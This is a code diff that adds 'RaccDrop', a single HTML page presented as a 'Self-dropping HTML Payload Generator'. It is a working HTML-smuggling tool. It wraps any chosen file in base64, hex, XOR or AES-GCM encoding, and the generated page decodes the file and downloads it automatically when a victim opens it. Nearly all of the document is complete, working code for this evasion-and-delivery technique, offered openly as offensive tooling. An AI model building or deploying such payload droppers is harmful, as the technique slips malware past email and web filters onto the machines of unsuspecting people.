@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>RaccDrop - Self-dropping HTML Payload Generator</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background-color: #000;
+      color: #b30000; /* dark red text */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      width: 100%;
+      max-width: 520px;
+      padding: 20px;
+      border: 2px solid #b30000; /* dark red border */
+      border-radius: 8px;
+      text-align: center;
+      background-color: #111; /* nearly black panel */
+    }
+    h1 {
+      margin: 0 0 10px;
+      font-size: 1.8rem;
+    }
+    h2 {
+      margin: 0 0 20px;
+      font-size: 1rem;
+      color: #b30000; /* keep dark red for headings */
+      font-weight: 600;
+    }
+    label {
+      display: block;
+      margin: 12px 0 6px;
+      font-weight: 600;
+      color: #b30000;
+      text-align: left;
+    }
+    input[type="file"], select, button {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 12px;
+      border: 1px solid #b30000;
+      border-radius: 4px;
+      background-color: #000;
+      color: #b30000;
+      font-size: 1rem;
+      outline: none;
+    }
+    select option {
+      background-color: #000;
+      color: #b30000;
+    }
+    button {
+      cursor: pointer;
+      font-weight: 700;
+    }
+    button:hover {
+      background-color: #b30000;
+      color: #000;
+    }
+    .status {
+      margin-top: 10px;
+      font-size: 0.95rem;
+      min-height: 1.5em;
+      text-align: left;
+    }
+    .ok { color: #00b33c; }   /* success green */
+    .err { color: #cc3333; }  /* error red */
+    .footer {
+      margin-top: 15px;
+      font-size: 0.85rem;
+      color: #b30000;
+      text-align: left;
+    }
+    .footer a {
+      color: #b30000;
+      text-decoration: underline;
+    }
+    .row {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 8px;
+      align-items: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🦝 RaccDrop</h1>
+    <h2>Self-dropping HTML Payload Generator</h2>
+
+    <div class="row">
+      <label for="fileInput">Select File</label>
+      <input type="file" id="fileInput" />
+
+      <label for="method">Choose Encoder/Encrypter</label>
+      <select id="method">
+        <option value="css">Hide the paws in CSS</option>
+        <option value="xor">Encrypt trash with XOR</option>
+        <option value="aes">Encrypt trash with AES-GCM</option>
+        <option value="base64">Encode with military grade Base64</option>
+        <option value="hex">Encode with H3x</option>
+      </select>
+
+      <button id="generateBtn">Generate Payload</button>
+    </div>
+
+    <div id="status" class="status">Choose your destiny</div>
+
+  <script>
+    (() => {
+      'use strict';
+
+      // ---------- Helpers ----------
+      const $ = sel => document.querySelector(sel);
+      const setStatus = (msg, cls = '') => {
+        const el = $('#status');
+        el.className = 'status ' + cls;
+        el.textContent = msg;
+      };
+
+      const sanitizeFilename = name =>
+        (name || 'file')
+          .replace(/[/\\:*?"<>|]/g, '_')
+          .replace(/\s+/g, ' ')
+          .trim()
+        || 'file';
+
+      const randomKey = (len = 16) => {
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        const buf = new Uint8Array(len);
+        crypto.getRandomValues(buf);
+        return Array.from(buf, b => chars[b % chars.length]).join('');
+      };
+
+      const toHex = str =>
+        Array.from(str, c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
+
+      const fromHex = hex => {
+        if (!/^[0-9a-fA-F]*$/.test(hex) || hex.length % 2 !== 0) {
+          throw new Error('Invalid hex payload');
+        }
+        const bytes = hex.match(/.{1,2}/g).map(h => parseInt(h, 16));
+        return String.fromCharCode(...bytes);
+      };
+
+      const xorEnc = (data, key) => {
+        const xored = Array.from(data, (c, i) =>
+          String.fromCharCode(c.charCodeAt(0) ^ key.charCodeAt(i % key.length))
+        ).join('');
+        return btoa(xored);
+      };
+
+      const xorDec = (b64, key) => {
+        const raw = atob(b64);
+        return Array.from(raw, (c, i) =>
+          String.fromCharCode(c.charCodeAt(0) ^ key.charCodeAt(i % key.length))
+        ).join('');
+      };
+
+      const aesGcm = {
+        async encrypt(plaintext, keyStr) {
+          const iv = crypto.getRandomValues(new Uint8Array(12));
+          const cryptoKey = await crypto.subtle.importKey(
+            'raw',
+            new TextEncoder().encode(keyStr),
+            { name: 'AES-GCM' },
+            false,
+            ['encrypt']
+          );
+          const encBuf = await crypto.subtle.encrypt(
+            { name: 'AES-GCM', iv },
+            cryptoKey,
+            new TextEncoder().encode(plaintext)
+          );
+          return {
+            ivB64: btoa(String.fromCharCode(...iv)),
+            ctB64: btoa(String.fromCharCode(...new Uint8Array(encBuf)))
+          };
+        }
+      };
+
+      const readAsDataURL = file => new Promise((resolve, reject) => {
+        const fr = new FileReader();
+        fr.onload = () => resolve(fr.result);
+        fr.onerror = () => reject(fr.error);
+        fr.readAsDataURL(file);
+      });
+
+      // ---------- Payload builder ----------
+      const makePayloadHTML = ({ fileName, method, payload }) => {
+        const jsonPayload = JSON.stringify({ name: fileName, method, ...payload });
+
+        const cssDiv = method === 'css'
+          ? `<div id="data" data-file="${payload.dataB64}"></div>`
+          : '';
+
+        return `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>RaccDrop payload</title>
+</head>
+<body>
+${cssDiv}
+<script id="payload" type="application/json">${jsonPayload}</script>
+<script>
+(async () => {
+  'use strict';
+  const el = document.getElementById('payload');
+  if (!el) throw new Error('Payload block missing');
+  const p = JSON.parse(el.textContent);
+
+  const fromHex = h => {
+    if (!/^[0-9a-fA-F]*$/.test(h) || h.length % 2 !== 0) throw new Error('Invalid hex');
+    return String.fromCharCode(...h.match(/.{1,2}/g).map(x => parseInt(x, 16)));
+  };
+  const xorDec = (d, k) => atob(d).split('')
+    .map((c, i) => String.fromCharCode(c.charCodeAt(0) ^ k.charCodeAt(i % k.length)))
+    .join('');
+  const aesDec = async (ivB64, ctB64, keyStr) => {
+    const iv = new Uint8Array([...atob(ivB64)].map(c => c.charCodeAt(0)));
+    const ct = new Uint8Array([...atob(ctB64)].map(c => c.charCodeAt(0)));
+    const key = await crypto.subtle.importKey('raw', new TextEncoder().encode(keyStr), { name: 'AES-GCM' }, false, ['decrypt']);
+    const pt = await crypto.subtle.decrypt({ name: 'AES-GCM', iv }, key, ct);
+    return new TextDecoder().decode(pt);
+  };
+
+  let dataUrl = '';
+  if (p.method === 'base64') dataUrl = atob(p.data);
+  else if (p.method === 'hex') dataUrl = fromHex(p.data);
+  else if (p.method === 'xor') dataUrl = xorDec(p.data, p.key);
+  else if (p.method === 'aes') dataUrl = await aesDec(p.ivB64, p.ctB64, p.key);
+  else if (p.method === 'css') {
+    const div = document.getElementById('data');
+    if (!div || !div.dataset || !div.dataset.file) throw new Error('CSS payload div missing');
+    dataUrl = atob(div.dataset.file);
+  } else {
+    throw new Error('Unknown method: ' + p.method);
+  }
+
+  const a = document.createElement('a');
+  a.href = dataUrl;
+  a.download = p.name || 'file';
+  document.body.append(a);
+  a.click();
+  a.remove();
+})().catch(err => {
+  const pre = document.createElement('pre');
+  pre.textContent = 'Failed to reconstruct file: ' + (err && err.message || err);
+  pre.style.color = '#cc3333';
+  document.body.append(pre);
+});
+<\/script>
+</body>
+</html>`;
+      };
+
+      // I HATE JAVASCRIPT - this will be ugly :D 
+      const fileInput = $('#fileInput');
+      const methodSel = $('#method');
+      const btn = $('#generateBtn');
+
+      btn.addEventListener('click', async () => {
+        try {
+          const file = fileInput.files && fileInput.files[0];
+          if (!file) {
+            setStatus('Please select a file.', 'err');
+            return;
+          }
+
+          const method = methodSel.value;
+          const fileName = sanitizeFilename(file.name);
+
+          setStatus('Reading file...');
+          const dataUrl = await readAsDataURL(file);
+
+          const needsKey = method === 'xor' || method === 'aes';
+          const key = needsKey ? randomKey(16) : undefined;
+
+          setStatus('Encoding...');
+          let payload;
+          if (method === 'base64') {
+            payload = { data: btoa(dataUrl) };
+          } else if (method === 'hex') {
+            payload = { data: toHex(dataUrl) };
+          } else if (method === 'xor') {
+            payload = { data: xorEnc(dataUrl, key), key };
+          } else if (method === 'aes') {
+            const { ivB64, ctB64 } = await aesGcm.encrypt(dataUrl, key);
+            payload = { ivB64, ctB64, key };
+          } else if (method === 'css') {
+            payload = { dataB64: btoa(dataUrl) };
+          } else {
+            throw new Error('Unsupported method');
+          }
+
+          const html = makePayloadHTML({ fileName, method, payload });
+
+          const blob = new Blob([html], { type: 'text/html' });
+          const url = URL.createObjectURL(blob);
+          const a = document.createElement('a');
+          a.href = url;
+          a.download = `raccdrop_${fileName}.html`;
+          document.body.append(a);
+          a.click();
+          a.remove();
+          setTimeout(() => URL.revokeObjectURL(url), 0);
+
+          setStatus('Payload generated successfully.', 'ok');
+        } catch (e) {
+          console.error(e);
+          setStatus('Error: ' + (e && e.message || e), 'err');
+        }
+      });
+    })();
+  </script>
+</body>
+</html>
